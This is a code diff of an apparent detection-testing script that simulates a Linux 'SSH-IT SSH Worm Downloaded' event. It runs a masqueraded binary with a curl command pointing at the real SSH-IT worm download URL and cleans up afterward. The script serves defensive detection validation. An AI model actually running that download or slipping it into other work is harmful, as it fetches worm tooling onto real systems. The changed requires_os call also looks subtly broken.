@@ -8,26 +8,29 @@ import sys
 from . import RtaMetadata, common
 
 metadata = RtaMetadata(
-    uuid="631a211d-bdaa-4b9d-a786-31d84d7bc070",
+    uuid="3ad5efdc-c186-4dbd-b5ce-f8d1f102002c",
     platforms=["linux"],
     endpoint=[
-        {"rule_id": "31da6564-b3d3-4fc8-9a96-75ad0b364363", "rule_name": "Tampering of Bash Command-Line History"},
+        {
+            "rule_name": "Potential SSH-IT SSH Worm Downloaded",
+            "rule_id": "cb351778-7329-4de9-82b5-6705f772a3af",
+        },
     ],
     siem=[],
-    techniques=["T1070", "T1070.003"],
+    techniques=["T1021", "T1563"],
 )
 
 
-@common.requires_os(*metadata.platforms)
+@common.requires_os(metadata.platforms)
 def main() -> None:
-    masquerade = "/tmp/history"
+    masquerade = "/tmp/curl"
     source = common.get_path("bin", "linux.ditto_and_spawn")
     common.copy_file(source, masquerade)
 
     # Execute command
-    common.log("Launching fake builtin commands for tampering of bash command line history")
-    command = "-c"
-    common.execute([masquerade, command], timeout=10, kill=True, shell=True)  # noqa: S604
+    common.log("Launching fake curl commands to download payload")
+    common.execute([masquerade, "curl", "https://thc.org/ssh-it/x"], timeout=5, kill=True)
+
     # cleanup
     common.remove_file(masquerade)
 
